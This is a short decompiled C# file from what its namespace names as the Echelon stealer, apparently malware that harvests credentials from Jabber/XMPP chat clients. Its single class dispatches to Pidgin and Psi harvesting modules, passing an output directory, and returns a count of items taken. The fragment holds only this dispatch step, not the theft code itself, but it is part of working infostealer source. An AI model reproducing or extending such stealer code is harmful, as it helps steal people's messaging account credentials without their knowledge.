using System;

namespace Echelon.Stealer.Jabber
{
	// Token: 0x02000017 RID: 23
	internal class Startjabbers
	{
		// Token: 0x0600003E RID: 62 RVA: 0x00004538 File Offset: 0x00002738
		public static int Start(string Echelon_Dir)
		{
			Pidgin.Start(Echelon_Dir);
			Psi.Start(Echelon_Dir);
			return Startjabbers.count;
		}

		// Token: 0x04000034 RID: 52
		public static int count;
	}
}
